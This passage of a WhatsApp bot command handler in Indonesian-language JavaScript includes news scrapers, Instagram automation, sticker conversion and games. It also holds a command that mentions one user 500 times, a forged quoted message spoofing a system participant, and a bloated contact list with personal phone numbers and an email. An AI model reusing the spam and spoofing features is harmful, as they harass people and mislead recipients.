						      teks += `Type: ${i.comic_type}\n`
						      teks += `Link: ${i.comic_url}\n`
						      teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						      hexa.sendImageCaption(from, buff, mek, teks)
						    }
						  })
						  break
						case "viva-news":
						  VivaNews().then(async (res) => {
						    buff = await getBuffer(res[0].berita_thumb)
						    teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						    no = 0
						    for (let i of res) {
						      no += 1
						      teks += `\n• ${no.toString()} •\n`
						      teks += `Berita: ${i.berita}\n`
						      teks += `Jenis: ${i.berita_jenis}\n`
						      teks += `Upload: ${i.berita_diupload}\n`
						      teks += `Link: ${i.berita_url}\n`
						    }
						    teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						    hexa.sendImageCaption(from, buff, mek, teks)
						  })
						  break
						case "kontan-news":
						  KontanNews().then(async (res) => {
						    buff = await getBuffer(res[0].berita_thumb)
						    teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						    no = 0
						    for (let i of res) {
						      no += 1
						      teks += `\n• ${no.toString()} •\n`
						      teks += `Berita: ${i.berita}\n`
						      teks += `Jenis: ${i.berita_jenis}\n`
						      teks += `Upload: ${i.berita_diupload}\n`
						      teks += `Link: ${i.berita_url}\n`
						    }
						    teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						    hexa.sendImageCaption(from, buff, mek, teks)
						  })
						  break
						case "merdeka-news":
						  MerdekaNews().then(async (res) => {
						    buff = await getBuffer(res[0].berita_thumb)
						    teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						    no = 0
						    for (let i of res) {
						      no += 1
						      teks += `\n• ${no.toString()} •\n`
						      teks += `Berita: ${i.berita}\n`
						      teks += `Upload: ${i.berita_diupload}\n`
						      teks += `Link: ${i.berita_url}\n`
						    }
						    teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						    hexa.sendImageCaption(from, buff, mek, teks)
						  })
						  break
						case "wamods-search":
if (!q) return reply('Mau cari apa?')
						  WAModsSearch(q).then(async (res) => {
						    no = 0
						    for (let i of res) {
						      no += 1
						      buff = await getBuffer(i.apk_image)
						      teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						      teks += `\n• Urutan: ${no.toString()} •\n`
						      teks += `Apk: ${i.apk_name}\n`
						      teks += "Description:\n"
						      teks += `${i.apk_desc}\n`
						      teks += `Link: ${i.apk_url}\n`
						      teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						      hexa.sendImageCaption(from, buff, mek, teks)
						    }
						  })
						  break
						case "emoji-image":
if (!q) return reply('Mau cari apa?')
						  Emojis(q).then(async (res) => {
						    no = 0
						    for (let i of res.unicode_pack) {
						      buff = await getBuffer(i.vendor_thumb)
						      no += 1
						      teks = "Unicode Description:\n"
						      teks += `${res.unicode_desc}\n`
						      teks += "\n•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						      teks += `\n• List: ${no.toString()} •\n`
						      teks += `Vendor: ${i.vendor_name}\n`
						      teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						      hexa.sendImageCaption(from, buff, mek, teks)
						    }
						  })
						  break
						case "coronainfo":
						  if (!q) return reply(from, "Negara?", mek)
						  CoronaInfo(q).then(res => {
						    teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						    teks += `\nNegara: ${res.negara}\n`
						    teks += `Informasi: ${res.informasi}\n`
						    teks += `Total Kasus: ${res.total_kasus}\n`
						    teks += `Total Kematian: ${res.total_kematian}\n`
						    teks += `Total Sembuh: ${res.total_sembuh}\n`
						    teks += `Link: ${res.informasi_lengkap}\n`
						    teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
						    reply(from, teks, mek)
						  })
						  break
						case "quotes":
							var res = await Quotes()
							teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							teks += `\nAuthor: ${res.author}\n`
							teks += `\nQuotes:\n`
							teks += `${res.quotes}\n`
							teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							reply(from, teks, mek)
							break
						case "cerpen":
						  var res = await Cerpen()
							teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							teks += "\nCerpen:\n\n"
							teks += res + "\n"
							teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							reply(from, teks, mek)
							break
						case "couple":
							var res = await Couples()
							female = await getBuffer(res.female)
							male = await getBuffer(res.male)
							teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							teks += "\nMale & Female\n"
							teks += "Couple Wallpaper\n"
							teks += `Male Source: ${res.male}\n`
							teks += `\nFemale Source: ${res.female}\n`
							teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							male = await hexa.sendImageCaption(from, male, mek, teks)
							hexa.sendImageCaption(from, female, male, teks)
							break
						case "darkjoke":
							var res = await Darkjokes()
							buff = await getBuffer(res)
							teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							teks += "\nDarkjokes?\n"
							teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							hexa.sendImageCaption(from, buff, mek, teks)
							break
						case "jalantikus-meme":
						  var res = await JalanTikusMeme()
							buff = await getBuffer(res)
							teks = "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							teks += "\nNgakak?\n"
							teks += `\nSource: ${res}\n`
							teks += "•°•°•°•°•°•°•°•°••°•°•°•°•°•°•°•°•"
							hexa.sendImageCaption(from, buff, mek, teks)
							break
			 /// --------- < INSTAGRAM WEB API > -------\\\
case "igblock":
 case "block":
  
        if (!q) return reply(`usernamenya mana?`);
        insta.block(q);
reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "igunblock":
       case "unblock":
  
        if (!q) return reply(`usernamenya mana?`);
        insta.unblock(q);
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "igfollow":
       case "follow":
        if (!q) return reply(`usernamenya mana?`);
        insta.follow(q);
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "igunfollow":
       case "unfolloe":
  
        if (!q) return reply(`usernamenya mana?`);
        insta.unfollow(q);
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "iglike":
       case "like":
  
        if (!q) return reply(`linknya mana?`);
        insta.like(q);
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "igunlike":
       case "unlike":
        if (!q) return reply(`linknya mana?`);
        insta.unlike(q);
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "igsavepost":
       case "savepost":
  
        if (!q) return reply(`linknya mana?`);
        insta.save(q);
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "igunsavepost":
       case 'unsavepost':
  
        if (!q) return reply(`linknya mana?`);
        insta.unsave(q);
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "igcomment":
       case "comment":
  
        if (!args.length) return reply("Link yang mau di add komen mana");
        var gh = _chats.slice(11);
        var link = gh.split("|")[0];
        var caption3 = gh.split("|")[1];
        if (!link) return reply("link nya mana?");
        if (!caption)
          return reply(
            `tambahin caption example ${prefix}igcomment https://www.instagram.com/p/CREaysLgeG4/?utm_medium=copy_link|komen mu`
          );
        insta.comment(link, caption3);
        break;
      case "upinstastory":
       case "upstory":
  
        if (!isQuotedImage) return reply("baru support image kak");
        var media = await downloadM();
        var bbi = await uploadImages(media, "tytyd");
        insta.upPhoto(bbi, q, "story");
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
      case "upinstafeed":
       case "upfeed":
  
        if (!isQuotedImage) return reply("baru support image kak");
        var media = await downloadM();
        var bbi = await uploadImages(media, "tytyd");
        insta.upPhoto(bbi, q, "feed");
        reply("🌍𝑺𝑼𝑪𝑪𝑬𝑺🌍");
        break;
case "q":
        if (!m.quoted) return reply("reply message!");
        let qse = hexa.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
case 'tes4':
const fkon ={
key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage' : { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname}, ;;;\nFN:${pushname}, \nitem1.TEL;waid=${sender.split("@")[0]}:${sender.split("@")[0]}\nitem1.X-ABLabel:creator\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/fake.jpeg')}}}
imeg = await hexa.prepareMessage(from, fs.readFileSync('./stik/fake.jpeg'), 'imageMessage')
imeu = imeg.message.imageMessage
hexa.relayWAMessage(await hexa.prepareMessageFromContent(from, {productMessage: {
businessOwnerJid: '6283157292861@s.whatsapp.net',
product: {
productId: '1011',
productImage:imeu,
title: 'ga tau',
description:  `ga tay`,
currencyCode: 'IDR',
priceAmount1000: '10000000',
retailerId: '0507',
url: 'https://wa.me/6283157292861',
productImageCount: 1,
salePriceAmount1000: '7.8000',
}
}
}, {quoted:fkon}))
let ler = await hexa.prepareMessage(from, fs.readFileSync('./stik/fake.jpeg'), image)
gbutsan = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER' }, type: 1 },
{ buttonId: `${prefix}speedtest`, buttonText: { displayText: 'PING' }, type: 1 },
]
gbuttonan = {
imageMessage: ler.message.imageMessage,
contentText: 'Hi Perkenalkan aku adalah hexa Bot yang menemanimu di saat kamu gabut/bete.',
footerText: 'Pilih Salah Satu Dibawah ini yah\n_____________________________________',
buttons: gbutsan,
headerType: 1
}
await hexa.sendMessage(from, gbuttonan, MessageType.buttonsMessage, {quoted: mek})
break
					case 'restart':
if ( !mek.key.fromMe) return reply(mess.only.ownerB)
reply(`_Restarting ${NamaBot}_`)
exec(`cd &&  node index`)
sleep(4000)
reply('Sukses')
break
				case 'detikvn':
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediam = await hexa.downloadAndSaveMediaMessage(encmediam)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(mediam)
						hexa.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
						fs.unlinkSync(mediam)
				break
				case 'detikvideo':
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					median = await hexa.downloadAndSaveMediaMessage(encmedian)
					cokmatane = Number(args[0])
					hah = fs.readFileSync(median)
						hexa.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
						fs.unlinkSync(median)
				break
case 'sticker':
					case 'stiker':
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await hexa.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											hexa.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
											fs.unlinkSync(`./sticker/${sender}.webp`)	
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else if ((isMedia && mek.message.videoMessage.fileLength < 10000000 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
							const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await hexa.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							reply(mess.wait)
								await ffmpeg(`${media}`)
									.inputFormat(media.split('.')[4])
									.on('start', function (cmd) {
										console.log(`Started : ${cmd}`)
									})
									.on('error', function (err) {
										console.log(`Error : ${err}`)
										fs.unlinkSync(media)
										tipe = media.endsWith('.mp4') ? 'video' : 'gif'
										reply(mess.error.api)
									})
									.on('end', function () {
										console.log('Finish')
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											if (error) return reply(mess.error.api)
											hexa.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)
											fs.unlinkSync(`./sticker/${sender}.webp`)
										})
									})
									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Kirim gambar/video dengan caption ${prefix}sticker atau tag gambar/video yang sudah dikirim\nNote : Durasi video maximal 10 detik`)
						}
						break
case 'mute':
			    if ( !mek.key.fromMe) return reply(mess.only.ownerB)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./lib/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
case 'setbio':
				if ( !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					hexa.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
					case 'setname':
					if ( !mek.key.fromMe) return reply(mess.only.ownerB)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                hexa.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if ( !mek.key.fromMe) return reply(mess.only.ownerB)
		  reply("Dadah <3")
		  await delay(1000)
				hexa.updatePresence(from, Presence.composing)
				hexa.groupLeave(from)
						break
					case 'setname':
					if ( !mek.key.fromMe) return reply(mess.only.ownerB)
		 		if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                hexa.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
case 'herolist':
await herolist().then((ress) => {
let listt = `*List hero untuk feature ${prefix}herodetail*\n\n`
for (var i = 0; i < ress.hero.length; i++) {
listt += '-  ' + ress.hero[i] + '\n'
}
reply(listt)
})
break
case 'herodetail':
res = await herodetails(body.slice(12))
her = `*Hero Details ${body.slice(12)}*

*Nama* : ${res.hero_name}
*Role* : ${res.role}
*Quotes* : ${res.entrance_quotes}
*Fitur Hero* : ${res.hero_feature}
*Spesial* : ${res.speciality}
*Rekomendasi Lane* : ${res.laning_recommendation}
*Harga* : ${res.price.battle_point} [Battle point] | ${res.price.diamond} [DM] | ${res.price.hero_fragment} [Fragment]
*Rilis* : ${res.release_date}

*Durability* : ${res.skill.durability}
*Offence* : ${res.skill.offense}
*Skill Effect* : ${res.skill_effects}
*Difficulty* : ${res.skill.difficulty}
 
*Movement Speed* : ${res.attributes.movement_speed}
*Physical Attack* : ${res.attributes.physical_attack}
*Magic Defense* : ${res.attributes.magic_defense}
*Ability Crit Rate* : ${res.attributes.ability_crit_rate}
*HP* : ${res.attributes.hp}
*Mana* : ${res.attributes.mana}
*Mana Regen* : ${res.attributes.mana_regen}

*Story* : ${res.background_story}`
reply(her)
break
				case 'google':
case 'googlesearch':
case 'ggs':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break
case 'wiki':
if (args.length < 1) return reply(' Yang Mau Di Cari Apa? ')
teks = args.join(' ')
res = await wikiSearch(teks).catch(e => {
return reply('_[ ! ] Error Hasil Tidak Ditemukan_') 
}) 
result = `*Judul :* ${res[0].judul}
*Wiki :* ${res[0].wiki}`
sendMediaURL(res[0].thumb, image, {quoted: mek, caption: result}).catch(e => {
  reply(result)
})
break
case 'mediafire':
if (args.length < 1) return reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
if (Number(filesize) >= 30000) return reply(`*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}
*Link :* ${res[0].link}

_Maaf size melebihi batas maksimal, Silahkan klik link diatas_`)
reply(mess.wait)
teks = args.join(' ')
res = await mediafireDl(teks)
result = `*Nama :* ${res[0].nama}
*Ukuran :* ${res[0].size}

_File sedang dikirim, Silahkan tunggu beberapa menit_`
reply(result)
sendFileFromUrl(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: mek})
break
case 'lirik3':
if (args.length < 1) return reply('Judulnya?')
reply(mess.wait)
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `${res[0].result}`
reply(lirik)
})
break
case 'teskatalog':
hayuk = `Tes 1`
pale = `Bewan dek?`
katalog(heker, hayuk, pale)
break
//Case truth
//--Kejujuran
case 'jujur':
 case 'oh':
const trut = truth[Math.floor(Math.random() * truth.length)]
hexa.sendMessage(from, `‣ *TRUTH*\n${trut}`, text,{quoted: fdocs})
break

//---Tantangan
   case 'tantangan':
gambar = fs.readFileSync('./lib/image/truth.jpeg')
const der = dare[Math.floor(Math.random() * dare.length)]
hexa.sendMessage(from, gambar, image,{quoted: fdocs,caption:`‣ *DARE*\n${der}`})
break
case 'truhordare':
 case 'truth':
  case 'dare':
   case 'tod':
    case 'TOD':
   hexa.updatePresence(from, Presence.recording)
var thumbnail = fs.readFileSync('./lib/image/truth.jpeg')
		var media = await hexa.prepareMessage(from, thumbnail, MessageType.image)
media.message = (Object.keys(media.message)[0] === 'ephemeralMessage') ? media.message.ephemeralMessage.message : media.message
	var IniButto = [
		{buttonId: `${prefix}oh`, buttonText: {displayText: 'Truth'}, type: 1},
		{buttonId: `${prefix}tantangan`, buttonText: {displayText: 'Dare'}, type: 1},
		]
		var buttonMessageee = {
		contentText: `Truth Or Dare`,
footerText: 'Click Here',
		buttons: IniButto,
		headerType: 4,
		imageMessage: media.message.imageMessage
		}
		await hexa.sendMessage(from, buttonMessageee, MessageType.buttonsMessage, {sendEphemeral:true, quoted: fvideo, jpegThumbnail: fs.readFileSync('./lib/image/cecan.jpeg'),contextInfo: {"forwardingScore":99999, "isForwarded":true}})
				break
//--Simsimi talk
				case 'simi':
					if (args.length < 1) return reply(`Hai ${pushname}`)
					teks = body.slice(6)
					try { 
					anu = await fetchJson(`https://simsumi.herokuapp.com/api?text=${teks}`, {method: 'get'})
					if (anu.error) return reply('Simi ga tau kak')
					 hexa.sendMessage(from, anu.success, text, {quoted: mek})
					} catch {
					  reply(mess.ferr)
					}
					break
case 'rptag':
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply("Gada yang di tag")
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
teks = `*Repeat Tag*\n${q}`
teks += "\n\n"
members_id = []
for (let z = 0; z < 500; z++) {
teks += ` @${mentioned[0].split("@")[0]}`
members_id.push(mentioned[0])
}
mentions(teks, members_id, true)
break
case 'call':
 case 'creator':
   case 'array':
    case 'owner':
hehe = hexa.sendMessage(from, {
"displayName": "‎kontol",
						"contacts": [
							{
								"displayName": "Not Found (400)",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:剷 偺 檨\nORG:菲諾·朱利安·安加拉\nitem1.TEL;waid=6288210864298:+62 882-1086-4298\nitem1.X-ABLabel:Creator(fino)\nitem2.EMAIL.;type=INTERNET:Finx999@gmail.com\nEND:VCARD"
							},
							{
								"displayName": "zzzz",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;𝙭ȿͥt͢aͣrͫs𠒎𠐓𠐔;;;\nFN:ȿͥt͢aͣrͫs𠒎𠐓𠐔\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 877534322\nitem1.X-ABLabel:Creator(fino)\nitem2.EMAIL.;type=INTERNET:Finx999@gmail.com\nEND:VCARD"
							},
							{
								"displayName": "Not Found (400)",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:G:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:Creator\nitem2.EMAIL.;type=INTERNET:Finx999@gmail.com\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
